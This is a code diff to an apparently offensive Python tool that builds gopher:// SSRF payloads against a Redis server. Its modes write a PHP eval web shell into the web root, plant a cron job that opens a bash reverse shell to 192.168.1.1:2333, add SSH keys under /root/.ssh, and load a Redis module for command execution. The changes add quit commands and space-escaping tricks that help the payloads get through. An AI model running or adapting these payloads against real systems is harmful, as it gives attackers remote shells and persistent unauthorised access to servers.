@@ -22,7 +22,8 @@ def generate_shell(filename,path,passwd,payload):
         "set 1 {}".format(payload),
         "config set dir {}".format(path),
         "config set dbfilename {}".format(filename),
-        "save"
+        "save",
+        "quit"
         ]
     if passwd:
         cmd.insert(0,"AUTH {}".format(passwd))
@@ -34,7 +35,8 @@ def generate_reverse(filename,path,passwd,payload): # centos
         "set 1 {}".format(payload),
         "config set dir {}".format(path),
         "config set dbfilename {}".format(filename),
-        "save"
+        "save",
+        "quit"
         ]
     if passwd:
         cmd.insert(0,"AUTH {}".format(passwd))
@@ -46,7 +48,8 @@ def generate_sshkey(filename,path,passwd,payload):
         "set 1 {}".format(payload),
         "config set dir {}".format(path),
         "config set dbfilename {}".format(filename),
-        "save"
+        "save",
+        "quit"
         ]
     if passwd:
         cmd.insert(0,"AUTH {}".format(passwd))
@@ -78,7 +81,7 @@ def rce_cleanup():
         "CONFIG SET dbfilename dump.rdb",
         "system.exec rm /tmp/{}".format(exp_filename).replace(" ","${IFS}"),
         "MODULE UNLOAD system",
-        "POST"
+        "quit"
         ]
     if passwd:
         cmd.insert(0,"AUTH {}".format(passwd))
@@ -94,14 +97,14 @@ def redis_format(arr):
     cmd+=CRLF
     return cmd
 
-def generate_payload(ip,port,passwd,mode):
+def generate_payload(passwd,mode):
 
     payload="test"
 
     if mode ==0:
         filename="shell.php"
         path="/var/www/html"
-        shell="\n\n<?php eval($_GET[\"cmd\"]);?>\n\n"
+        shell="\n\n<?=eval($_GET[0]);?>\n\n"
 
         cmd=generate_shell(filename,path,passwd,shell)
 
@@ -110,14 +113,14 @@ def generate_payload(ip,port,passwd,mode):
         path="/var/spool/cron/"
         shell="\n\n*/1 * * * * bash -i >& /dev/tcp/192.168.1.1/2333 0>&1\n\n"
 
-        cmd=generate_reverse(filename,path,passwd,shell)
+        cmd=generate_reverse(filename,path,passwd,shell.replace(" ","^"))
 
     elif mode==2:
         filename="authorized_keys"
         path="/root/.ssh/"
         pubkey="\n\nssh-rsa "
 
-        cmd=generate_sshkey(filename,path,passwd,pubkey)
+        cmd=generate_sshkey(filename,path,passwd,pubkey.replace(" ","^"))
         
     elif mode==3:
         lhost="192.168.1.100"
@@ -130,12 +133,17 @@ def generate_payload(ip,port,passwd,mode):
         cmd=rce_cleanup()
 
     elif mode==4:
-        generate_info(passwd)
+        cmd=generate_info(passwd)
+
     protocol="gopher://"
+
+    ip="127.0.0.1"
+    port="6379"
+
     payload=protocol+ip+":"+port+"/_"
 
     for x in cmd:
-        payload += quote(redis_format(x))
+        payload += quote(redis_format(x).replace("^"," "))
     return payload
 
     
@@ -151,9 +159,6 @@ if __name__=="__main__":
     # input auth passwd or leave blank for no pw
     passwd = '' 
 
-    ip="127.0.0.1"
-    port="6379"
-    
-    p=generate_payload(ip,port,passwd,mode)
+    p=generate_payload(passwd,mode)
     print(p)
 
